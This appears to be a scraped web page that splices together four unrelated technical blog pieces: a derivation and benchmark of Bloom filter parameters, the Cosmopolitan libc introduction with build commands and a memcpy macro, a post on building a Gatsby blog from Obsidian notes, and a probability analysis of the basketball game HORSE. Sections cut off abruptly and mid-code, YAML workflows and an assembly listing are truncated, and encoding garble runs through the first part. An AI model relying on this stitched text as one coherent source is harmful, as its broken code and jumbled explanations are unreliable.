<p>Once an element is placed in $F$, it will remain there, as flipping bits to remove an element introduces the possibility of false negatives. We will show that there exists optimal parameters, $k$ hash functions and $m$ length bit array, to lower the false positive rate $\epsilon$.</p>



<h2 id="proof">Proof</h2>
<p>Note: This section is pretty math heavy, if you just want to look at the cool tables and graphs then you can skip ahead to <a href="#implementation-and-benchmarks">here</a>.</p>

<p>$\newcommand{\pbrac}[1]{\left(#1\right)}$
$\newcommand{\sbrac}[1]{\left[#1\right]}$</p>

<h3 id="first-attempt">First attempt</h3>
<p>Assume that a hash function in $K$ maps to each array position with <em>equal probability</em>. The probability that a bit is not set by a hash function during the insertion of an element is:</p>

<p>\begin{align}
    1 - \frac{1}{m}.
\end{align}</p>

<p>The probability that every hash function in $K$ leaves a certain bit at 0 will be</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^k \approx \ e^{-k/m}.
\end{align}</p>

<p>Thus, after inserting $n$ elements, the probability that a bit is <em>still</em> 0 is</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^{kn} \approx \ e^{-kn/m} \ = \ p,
\end{align}</p>

<p>and the probability that a bit is 1 after $n$ insertions is</p>

<p>\begin{align}
    \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right) \approx \left( 1 - p \right).
\end{align}</p>

<p>Next, we test set membership for an element NOT in the set. Following $n$ insertions, each bit in the array has a chance of being set to 1 with the probability above. The probability that $k$ bits are set to 1, which would lead to a false positive result for set membership, is often referred to as the error/false positive rate:</p>

<p>\begin{align}
    \epsilon = \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right)^k \approx \left( 1 - p \right)^k.
\end{align}</p>

<p>There exists a major problem with this analysis, however. At the start we made an assumption that all bits would be set randomly and independently. <strong>This is not correct</strong> as we have established that <em>all</em> our hash functions in $K$ will not hash an element to the same array position. For example, if we have hashed an element $m-1$ times into $m-1$ different positions, then the remaining $1$ bit in the array is guaranteed to be chosen, if we wish to retain an even spread of hashed values. Concretely, the $k$ bit array positions for each element are in fact <em>dependent</em>.</p>

<h3 id="another-try-using-poisson-approximations">Another try using Poisson approximations</h3>

<p>Consider a â€œballs and binsâ€� scenario where each throw of a ball into a bin is equivalent to hashing an element to an array position.</p>

<p>We have the following 2 cases:</p>
<ul>
  <li><strong>Exact case:</strong> $n$ balls are thrown into $m$ bins independently and uniformly at random</li>
  <li><strong>Poisson case:</strong> number of balls in each bin are taken to be independent Poisson random variables with an expected value</li>
</ul>

<p>Weâ€™ll be using the following corollaries from the book <em>â€œProbability and computing: randomization and probabilistic techniques in algorithms and data analysisâ€�</em> by Mitzenmacher and Upfal.</p>

<p><strong>Corollary 4.6:</strong> Let $X_1,â€¦,X_n$ be independent Poisson trials such that $P(X_i = 1) = p_i$. Let $X = \sum_{i=1}^{n} \text{ and } \mu = E(X)$. For $0 &lt; \delta &lt; 1$. [p. 71]
\begin{align}
    P\left(\left|X - \mu\right| \geq \delta \mu\right) \leq 2\exp{\left(-\frac{\mu\delta^2}{3}\right)}
\end{align}</p>

<p><strong>Corollary 5.9:</strong> any event that takes place with probability $p$ in the Poisson case takes place with probability at most $p e \sqrt{n}$ in the exact case. [p. 109]</p>

<p>Each bin corresponds to an array position and thus a bit being set to 0 is equivalent to an empty bin in our scenario. The fraction of bits being set to 0 after $n$ insertions is therefore equivalent to the fraction of empty bins after $kn$ balls have been thrown into $m$ bins.</p>

<p>We define $X$ as the number of empty bins after the balls have been thrown into $n$ bins, such that</p><p>

\[\begin{align}
    X =&amp; \ \sum_{i=1}^{n} X_i, \\
    \text{where } X_i =&amp; \
    \begin{cases}
        1 &amp; \text{if bin is empty} \\
        0 &amp; \text{otherwise}
    \end{cases}
\end{align}\]

</p><p>then we can define</p><p>

\[\begin{align}
    p' =&amp; \ \left( 1 - \frac{1}{m}\right)^{kn}, \\
    E(X) =&amp; \ mp'.
\end{align}\]

</p><p>In the Poisson case, each bin can be thought of as an independent Poisson random variable with expected value $pâ€™$. Therefore, we can apply \textbf{corollary 4.6} and $E(X) = \ mpâ€™$ to obtain the following:</p>

<p>\begin{align}
    P\left( \left| X - mpâ€™\right| \geq \delta mpâ€™\right) \ \leq&amp; \ 2\exp{\left(-\frac{mpâ€™\delta^2}{3}\right)}
\end{align}
Let $\delta \ = \ \beta / pâ€™, \ $choose small$ \ \beta$
\begin{align}
    \therefore \ P\left( \left| X - mpâ€™\right| \geq \beta m\right) \ \leq&amp; \ 2\exp{\left(-\frac{m\beta^2}{3pâ€™}\right)}
\end{align}</p>

<p>We then apply <strong>corollary 5.9</strong> to obtain</p><p>

\[\begin{align}
    P\left( \left| X - mp'\right| \geq \beta m\right) \ \leq&amp; \ 2e\sqrt{kn} \exp{\left(-\frac{m\beta^2}{3p'}\right)}\\
    \leq&amp; \ 0.000001 \ \text{when $m$ sufficiently large.}
\end{align}\]

</p><p>Essentially, taking the probability of an event using a Poisson approximation for all of the bins and multiplying it by $e\sqrt{kn}$ gives an upper bound for the probability of the event when $kn$ balls are thrown into $m$ bins (the exact case where events are independent).</p>

<p>This result tells us that when $m$ is sufficiently large, the fraction of empty bins $X/m$ is <em>very</em> close to $pâ€™$. And since $pâ€™ \approx p$ we can use $p$ to continue predicting actual performance.</p>

<h3 id="optimal-k">Optimal <em>k</em></h3>

<p>The false positive rate is $\epsilon = (1-p)^k$ and we look for a $k$ that minimizes $\epsilon$. Rearranging $\epsilon$ gives us</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-p}^k \\
    =&amp; \ \exp{\pbrac{\ln{\pbrac{\sbrac{1-p}^k}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-p}}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-e^{-kn/m}}}}}}.
\end{align}\]

</p><p>If we let $g = k\ln{\pbrac{1-e^{-kn/m}}}$ so that $\epsilon = e^g$, then minimizing the false positive $\epsilon$ is equivalent to minimizing $g$ with respect to $k$. We have</p>

<p>\begin{align}
    \frac{dg}{dk}\ =&amp; \ \ln \left(1-e^{-\frac{nk}{m}}\right)+\frac{kn \cdot e^{-\frac{nk}{m}}}{m\left(1-e^{-\frac{nk}{m}}\right)}.
\end{align}</p>

<p>Solving this derivative when it is 0 and finding the global minimum gives us</p>

<p>\begin{align}
    k = \frac{m}{n}\ln\pbrac{2}.
\end{align}</p>

<h3 id="optimal-m">Optimal <em>m</em></h3>
<p>To find an optimal length for our bit-array we substitute $k = \frac{m}{n}\ln\pbrac{2}$ into our false positive equation and get</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-e^{-\ln 2}}^{\frac{m}{n}\ln 2} \\
    \ln\epsilon \ =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln\pbrac{1-e^{-\ln 2}} \\
    =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln{\frac{1}{2}} \\
    =&amp; \ -\frac{m}{n}\ln\pbrac{2}^2 \\
    \therefore m \ =&amp; \ \frac{-n\ln\epsilon}{\ln\pbrac{2}^2}.
\end{align}\]

</p><p>This effectively leaves $\epsilon$ as the only unknown variable left. However, when we consider the Bloom filter in a practical context, we will most likely have a false positive rate in mind, and can treat it as a constant.</p>



<h2 id="implementation-and-benchmarks">Implementation and benchmarks</h2>

<h3 id="overview">Overview</h3>
<p>We will be comparing the Bloom filter against 4 popular and efficient implementations of hash tables:</p>

<ul>
  <li>Google Dense Hash Set</li>
  <li>Google Sparse Hash Set</li>
  <li>TSL Robin Set</li>
  <li>STD Unordered Set</li>
</ul>

<p>Implementations were compared based on time performance (insert, read) and memory performance (inserts). Currently, only small strings (15 characters) and medium strings (50 characters) are used for input, with up to $n = 3\times10^6$ elements for each test. Each test was performed 5 times for each implementation and an average-of-5 was used in the final table/graph. The false positive rate is set to 0.01.</p>

<p>Benchmarking was done using gccâ€™s C++ compiler and the following command was run to compile: g++ -Iinclude -std=c++11 -O3. In addition, the tests were performed on a computer with the following specs:</p>

<ul>
  <li>AMD Ryzen 5 2600 3.4GHz 6 core</li>
  <li>8GB DDR4-2666 CL19</li>
</ul>

<p>The tests were run with the false positive rate $\epsilon = 0.01$</p>



<h3 id="insert-small-string-15-bytes">Insert small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and then insert each string as an entry into the sets, measuring the performance of said insert operation. The Bloom filterâ€™s only overhead during insertion is setting bits to 1.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/insert_small_string.png" width="700"></p>



<h3 id="read-small-string-15-bytes">Read small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and pre-load the strings into the hash tables. We then traverse the same vector of small strings, testing set membership and timing said read operation.</p>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>

<h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2>
<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>
</ol>
<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>

<span>}</span></code></pre></div>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>

<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>

          -H "Content-Type: application/json" \

<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish

<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>

<p><strong>TL;DR</strong>: If you want to win at HORSE, it’s generally a much better strategy to attempt high percentage shots. It almost never makes sense to shoot crazy half-court shots or behind-the-back shots. As a general rule of thumb, never attempt shots that you can’t shoot at &gt;50%.</p>

<hr>

<p><br>
<a href="https://en.wikipedia.org/wiki/Variations_of_basketball#H-O-R-S-E">HORSE</a> is a popular basketball shooting game. The main choice a HORSE player must make is which spots on the basketball court to attempt shots from. What’s the best strategy to win at HORSE?</p>

<h3 id="game-rules">Game rules</h3>
<p>The version of HORSE I’m analysing here involves two players. In the beginning, it’s Player 1’s turn. The player whose turn it is will be called “C”, and the other player will be called “O”.</p>
<ol>
  <li>C picks a spot on the basketball court and attempts a shot.
    <ul>
      <li>If C misses the shot, it is O’s turn, and we go back to 1.</li>
    </ul>
  </li>
  <li>If C makes the shot, O must now attempt the same shot.
    <ul>
      <li>If O makes the shot, C’s turn continues, and we go back to 1.</li>
      <li>If O misses the shot, they get a letter. C’s turn continues, and we go back to 1.</li>
    </ul>
  </li>
  <li>Once any player has gotten 5 letters, ie HORSE, they lose the game.</li>
</ol>

<p>On Player 2’s turn, Player 1 has no real strategy - they must simply try their best to make the shots that Player 2 makes. The only strategy a player can control is which shots they attempt when it’s their turn.</p>

<h3 id="expected-number-of-turns">Expected number of turns</h3>

<h4 id="deriving-the-formula">Deriving the formula</h4>

<p>Let us calculate the optimal shot on Player 1’s turn. Note that a “turn” lasts as long as the player whose turn it is does not miss their shot. We will assume that Player 1 will shoot the same optimal shot each time it is their turn. Let \(p_1\) be the probability that Player 1 makes this shot, \(p_2\) be the probability that Player 2 makes the same shot, and \(e_N\) be the expected number of turns for Player 1 to win \(N\) letters.</p>

<p>If Player 1 misses the shot, the expected number of turns going forward is \(1 + e_N\), since Player 1 has used up the current turn, and must restart in the same position next turn. If Player 1 makes the shot, and Player 2 misses the shot, the expected number of turns is \(e_{N-1}\), since the turn continues with one less letter to win. Finally, if Player 1 and Player 2 both make the shot, the expected number of turns is simply \(e_N\). Putting these together, we have</p><p>

\[\begin{equation}
e_N = (1 - p_1) (1 + e_N) + p_1 (1 - p_2) e_{N - 1} + p_1 p_2 e_N
\end{equation}\]

</p><p>Re-arranging and expanding for \(e_{N-1},e_{N-2}\ldots e_0\), we get</p><p>

\[\begin{eqnarray}
e_N - e_{N - 1} &amp;= \frac{1 - p_1}{p_1 (1 - p_2)} \\
\vdots \\
e_1 - e_0 &amp;= \frac{1 - p_1}{p_1 (1 - p_2)}
\end{eqnarray}\]

</p><p>\(e_0\) must be \(1\), since \(p_1=1, p_2=0 \implies e_1=1\). Adding the equations above and re-arranging, we get</p><p>

\[e_N = 1 + N\frac{1 - p_1}{p_1 (1 - p_2)}\]

</p><p>For the game of HORSE, \(N=5\), and so the expected number of turns to win HORSE is</p><p>

\[e_5 = 1 + 5\frac{1 - p_1}{p_1 (1 - p_2)} \tag{1} \label{eq:one}\]

</p><p>Our goal is to minimize \(e_5\). \(e_5\) increases with the inverse of the quantities \(\frac{p_1}{1 - p_1}\) and \((1 - p_2)\). Since the former grows much faster than the latter, we can intuit that increasing \(p_1\) is a lot more important than decreasing \(p_2\).</p>

<h4 id="visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</h4>

<p>Since this is a function of two variables, we can visualize it with a contour plot.</p>

<p><img src="https://rishicomplex.github.io/assets/formula.png" alt="Contour plot of function"></p>

<p>As the color gets darker, the expected number of turns decreases, ie we’re more likely to win. As we would expect, the plot gets darker for higher values of \(p_1\) and lower values of \(p_2\), ie to the right and bottom of the plot. What’s interesting to note is that the contour lines are “squeezed” more toward the right than the bottom, indicating that a high \(p_1\) has a stronger effect than a low \(p_2\). For example, if \(p_2=0\) and \(p_1=0.2\), \(\eqref{eq:one}\) gives us \(e_5=21\), whereas if \(p_1=1\) and \(p_2=0.8\) we get \(e_5=1\).</p>

<h4 id="verification-via-simulation">Verification via simulation</h4>

<p>Another way to calculate \(e_5\) empirically is to simulate \(G\) games for each value of \(p_1\) and \(p_2\), and then average the number of turns the game takes to finish over all the games. Doing this with \(G=1000\), I get this plot:</p>

<p><img src="https://rishicomplex.github.io/assets/simulation.png" alt="Contour plot of simulation"></p>

<p>which matches the previous plot. The squiggles are due to randomness.</p>

<h3 id="analyzing-some-special-cases">Analyzing some special cases</h3>

<p>In reality, \(p_1\) and \(p_2\) tend to be related to one another, since shots that are harder for one player tend to be harder for the other player as well.</p>

<p>Let us analyse some special cases, corresponding to the straight lines in the following plot.</p>

<p><img src="https://rishicomplex.github.io/assets/straight_lines.png" alt="Contour plot with straight lines"></p>

<h4 id="both-players-are-equally-good-shooters">Both players are equally good shooters</h4>
<p>This corresponds to the red line above. Here, \(p_1 = p_2\), and \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + \frac{5}{p_1}\]

</p><p>To minimize this, we should pick shots with a \(p_1\) as high as possible. For example, if we keep making layups at a probability of \(0.9\) each, we’d expect the game to be over in less than \(7\) turns.</p>

<h4 id="player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</h4>

<p>Let’s say Player 1 always shoots 10% better than Player 2 for any shot. That is, \(p_2 = min(p_1 - 0.1, 0)\) (yellow line above), and when \(p1&gt;0.1\), \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (1.1 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_better.png" alt="Player 1 better"></p>

<p>It is minimized at \(p_1=1\), where \(e_5=1\), that is, the game ends in one turn. Again, Player 1 wants to pick their highest probability shot.</p>

<h4 id="player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</h4>

<p>Here, we set \(p_2 = p_1 + 0.1\) (orange line above), which gives us for \(p_1 &lt; 0.9\)</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (0.9 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

